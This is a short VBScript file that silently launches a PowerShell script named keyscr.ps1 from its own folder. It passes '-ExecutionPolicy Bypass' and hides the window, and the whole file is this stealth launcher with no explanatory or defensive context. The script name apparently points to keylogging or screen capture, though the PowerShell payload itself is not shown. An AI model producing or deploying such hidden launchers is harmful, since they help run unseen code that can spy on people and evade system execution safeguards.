Set objShell = WScript.CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set F = FSO.GetFile(Wscript.ScriptFullName)
path = FSO.GetParentFolderName(F)
objShell.Run(CHR(34) & "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "" -ExecutionPolicy Bypass & ""'"  & path & "\keyscr.ps1'" & CHR(34)), 0, True
